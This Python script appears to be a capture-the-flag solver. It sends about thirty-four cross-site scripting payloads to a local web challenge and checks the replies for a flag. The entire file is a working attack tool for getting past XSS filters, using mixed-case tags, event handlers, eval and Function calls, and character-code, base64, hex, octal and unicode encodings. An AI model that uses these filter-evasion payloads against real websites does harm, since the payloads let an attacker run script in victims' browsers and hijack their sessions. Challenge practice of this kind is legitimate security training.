import requests
import urllib.parse
import re

target = "http://127.0.0.1:32808"
endpoint = "/page"

def send_payload(payload, test_name):
    """Send payload and check response"""
    data = {'name': payload}
    response = requests.post(target + endpoint, data=data)
    
    has_filter = "Sorry you can't use:" in response.text
    filter_match = re.search(r"Sorry you can't use: '([^']+)'", response.text)
    blocked_content = filter_match.group(1) if filter_match else None
    
    is_reflected = payload in response.text
    flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
    has_flag = len(flag_matches) > 0
    
    print(f"\n=== {test_name} ===")
    print(f"Payload: {payload[:80]}")
    if len(payload) > 80:
        print(f"         {payload[80:160]}")
    print(f"Status: {response.status_code}")
    print(f"Filter: {has_filter}")
    if blocked_content:
        print(f"Blocked: '{blocked_content}'")
    print(f"Reflected: {is_reflected}")
    print(f"Flag: {flag_matches if has_flag else 'None'}")
    
    return {
        'test_name': test_name,
        'payload': payload,
        'status_code': response.status_code,
        'has_filter': has_filter,
        'blocked_content': blocked_content,
        'is_reflected': is_reflected,
        'has_flag': has_flag,
        'flag_matches': flag_matches,
        'response_text': response.text if (is_reflected or has_flag) else None
    }

print("=" * 70)
print("ADVANCED BYPASS - USING ONLY ALLOWED CHARACTERS")
print("=" * 70)

results = []

# Test 1: Uppercase variations that might bypass case-sensitive blocks
print("\n[+] Testing uppercase-only payloads (avoiding blocked lowercase)")
uppercase_tests = [
    ("<BodY onLoAd=eval('confirm(1)')>", "BodY tag uppercase"),
    ("<DeTails oPen oNtoGgLe=eval('confirm(1)')>", "DeTails uppercase"),
    ("<InPuT AuToFoCuS OnFoCuS=eval('confirm(1)')>", "InPuT uppercase"),
    ("<TeXtArEa AuToFoCuS OnFoCuS=eval('confirm(1)')>", "TeXtArEa uppercase"),
    ("<SvG OnLoAd=eval('confirm(1)')>", "SvG uppercase"),
]

for payload, name in uppercase_tests:
    result = send_payload(payload, name)
    results.append(result)

print("\n" + "=" * 70)
print("TESTING ALTERNATIVE EXECUTION METHODS")
print("=" * 70)

# Test 2: Using eval() with different syntax
alternative_tests = [
    # Using eval with different quotes
    ("<img src=x onerror=eval(\"confirm(1)\")>", "eval double quotes"),
    ("<img src=x onerror=eval('confirm(1)')>", "eval single quotes"),
    ("<img src=x onerror=eval`confirm(1)`>", "eval template literal"),
    
    # Using Function constructor
    ("<img src=x onerror=Function('confirm(1)')()>", "Function constructor"),
    
    # Using setTimeout
    ("<img src=x onerror=setTimeout('confirm(1)',0)>", "setTimeout"),
    
    # Using setInterval
    ("<img src=x onerror=setInterval('confirm(1)',0)>", "setInterval"),
    
    # Using location=javascript:
    ("<img src=x onerror=location='javascript:confirm(1)'>", "location javascript"),
]

for payload, name in alternative_tests:
    result = send_payload(payload, name)
    results.append(result)

print("\n" + "=" * 70)
print("STRING CONSTRUCTION BYPASS")
print("=" * 70)

# Test 3: Building strings without blocked characters
string_construction_tests = [
    # Using fromCharCode for 'alert' = [97,108,101,114,116]
    ("<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", "fromCharCode alert"),
    
    # Using fromCharCode for 'confirm' = [99,111,110,102,105,114,109]
    ("<img src=x onerror=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "fromCharCode confirm"),
    
    # Building string with concatenation
    ("<img src=x onerror=eval('con'%2b'firm(1)')>", "String concat eval"),
    ("<img src=x onerror=eval('ale'%2b'rt(1)')>", "String concat alert"),
    
    # Using template literals
    ("<img src=x onerror=eval`confirm(1)`>", "eval template"),
    ("<img src=x onerror=alert`1`>", "alert template"),
]

for payload, name in string_construction_tests:
    result = send_payload(payload, name)
    results.append(result)

print("\n" + "=" * 70)
print("TAG/EVENT OBFUSCATION")
print("=" * 70)

# Test 4: Using unusual tags and events
obfuscation_tests = [
    # Using keygen (has 'g' - allowed)
    ("<keygen autofocus onfocus=eval('confirm(1)')>", "keygen tag"),
    
    # Using video
    ("<video src=x onerror=eval('confirm(1)')>", "video tag"),
    
    # Using audio
    ("<audio src=x onerror=eval('confirm(1)')>", "audio tag"),
    
    # Using embed
    ("<embed src=x onerror=eval('confirm(1)')>", "embed tag"),
    
    # Using object
    ("<object data=x onerror=eval('confirm(1)')>", "object tag"),
    
    # Using isindex (deprecated but might work)
    ("<isindex autofocus onfocus=eval('confirm(1)')>", "isindex tag"),
]

for payload, name in obfuscation_tests:
    result = send_payload(payload, name)
    results.append(result)

print("\n" + "=" * 70)
print("CHARACTER SUBSTITUTION TESTS")
print("=" * 70)

# Test 5: Substituting blocked characters
substitution_tests = [
    # Using different case for event names (onError vs onerror)
    ("<img src=x onError=eval('confirm(1)')>", "onError mixed case"),
    ("<img src=x oNError=eval('confirm(1)')>", "oNError random case"),
    
    # Using newlines in event name
    ("<img src=x on\nerror=eval('confirm(1)')>", "on\nerror newline"),
    
    # Using tabs in event name  
    ("<img src=x on\terror=eval('confirm(1)')>", "on\terror tab"),
    
    # Using form feed
    ("<img src=x on\ferror=eval('confirm(1)')>", "on\ferror form feed"),
]

for payload, name in substitution_tests:
    result = send_payload(payload, name)
    results.append(result)

print("\n" + "=" * 70)
print("PER-MUTATION CHARCODE ENCODING")
print("=" * 70)

# Test 6: Extremely encoded payloads
extreme_tests = [
    # Base64 encoding 'confirm(1)' = Y29uZmlybSgx)
    ("<img src=x onerror=eval(atob('Y29uZmlybSgxKQ=='))>", "Base64 eval"),
    
    # URL encode just the blocked characters
    ("<img src=x onerror=eval('confirm(1)')>", "Original"),
    
    # Hex escape in JavaScript string
    ("<img src=x onerror=eval('\\x63\\x6f\\x6e\\x66\\x69\\x72\\x6d\\x28\\x31\\x29')>", "Hex escape JS"),
    
    # Octal escape
    ("<img src=x onerror=eval('\\143\\157\\156\\146\\151\\162\\155\\050\\061\\051')>", "Octal escape JS"),
    
    # Unicode escape
    ("<img src=x onerror=eval('\\u0063\\u006f\\u006e\\u0066\\u0069\\u0072\\u006d\\u0028\\u0031\\u0029')>", "Unicode escape JS"),
]

for payload, name in extreme_tests:
    result = send_payload(payload, name)
    results.append(result)

print("\n" + "=" * 70)
print("FINAL ANALYSIS")
print("=" * 70)

# Analyze results
successful_bypasses = []
blocked_payloads = []
all_flags = []

for r in results:
    if not r['has_filter'] and r['is_reflected']:
        successful_bypasses.append(r)
    elif r['has_filter']:
        blocked_payloads.append(r)
    
    if r['has_flag']:
        all_flags.extend(r['flag_matches'])

print(f"\n[!] BYPASS ATTEMPTS: {len(results)}")
print(f"[!] SUCCESSFUL BYPASSES: {len(successful_bypasses)}")
print(f"[!] BLOCKED BY FILTER: {len(blocked_payloads)}")

if successful_bypasses:
    print(f"\n[+] WORKING PAYLOADS (No filter trigger):")
    for sb in successful_bypasses[:5]:
        print(f"  · {sb['test_name']}")
        print(f"    Payload: {sb['payload'][:60]}")

if blocked_payloads:
    print(f"\n[-] Top 5 Blocked Characters:")
    blocked_counts = {}
    for bp in blocked_payloads:
        if bp['blocked_content']:
            char = bp['blocked_content']
            blocked_counts[char] = blocked_counts.get(char, 0) + 1
    
    for char, count in sorted(blocked_counts.items(), key=lambda x: x[1], reverse=True)[:5]:
        print(f"  · '{char}': {count} times")

if all_flags:
    print(f"\n[!!!] FLAGS DISCOVERED: {all_flags}")
    print("=" * 70)
    for flag in all_flags:
        print(f"FLAG: {flag}")
else:
    print(f"\n[-] No FLAG{{}} patterns found")
    print("[-] Need more sophisticated bypass techniques")

print("\n" + "=" * 70)

